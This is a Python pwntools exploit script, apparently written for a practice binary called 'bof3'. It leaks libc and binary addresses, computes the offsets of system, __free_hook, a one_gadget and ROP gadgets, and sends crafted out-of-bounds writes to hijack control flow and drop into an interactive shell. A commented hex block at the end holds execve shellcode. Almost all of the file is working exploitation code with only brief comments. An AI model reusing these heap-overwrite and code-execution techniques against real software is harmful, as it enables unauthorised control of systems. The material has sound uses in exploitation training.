import pwn
gdb = """
b *aaaa+200
b free
set $m = aaaa-0x1296
b *aaaa+161
c
"""
p = pwn.gdb.debug("./bof3",gdbscript = gdb)
#p = pwn.process("./bof3")
p.recvuntil('puts ')
puts = p.readline()[:14]
puts = int(puts.decode('utf-8'),16)

p.recvuntil('main ')
aaaa = p.readline()[:14]
aaaa = int(aaaa.decode('utf-8'),16)
main = aaaa-0x1296
free = main + 0x3f98

rop = pwn.ELF("./bof3")
puts_plt = rop.symbols['puts']+main

libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_base = puts - libc.symbols['puts']
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
aligned_heap_area = free_hook + 0x28

heap_base = libc_base-0x23000+0x10
write_offset = int((free_hook-heap_base)/8)
one_gadget = libc_base+0xcb79a

pwn.log.info("LIBC BASE : "+ str(hex(libc_base)))
pwn.log.info("MAIN : "+ str(main))
pwn.log.info("OFFSET : " + str(write_offset))
pwn.log.info("Free_hook : " + str(hex(free_hook)) + " v Heap Base + offset : " +str(hex(write_offset*8+heap_base)))
pwn.log.info("System : "+str(hex(system)))
pwn.log.info("System in dec: "+str(system))

#over write free by aaaa -> function repeat 

p.sendline(str(134512))
p.sendline(str(write_offset))
p.write(str(main+0x1367))
print(p.clean().decode('latin1'))

# overwrite __free_hook with function's address -> call that function with rdi = "/bin/sh"
# can only call to anything near main 

heap_base_2 = heap_base - 0x21000

#malloc(0) == main+0x2a0
fini_array = main + 0x3d88
pop_rdi = main + 0x00001433	
pop_rsi_r15 = main + 0x00001431
atol = main+0x3fc8

offset_2 = int((aligned_heap_area - heap_base_2)/8) #overwrite atol = execve

pwn.log.info("OFFSET : " + str(offset_2))
pwn.log.info("Heap 2 : "+str(hex(heap_base_2)))
pwn.log.info("Value : "+str(int(4)))

p.sendline(str(134512))
p.sendline(str(offset_2))
p.sendline(str(4))
p.interactive()
print(p.clean().decode('latin1'))



#shellcode
"""
90 48 c7 c6 00 00 00 00
90 48 c7 c2 00 00 00 00
90 48 c7 c0 3b 00 00 00
0f 05
"""
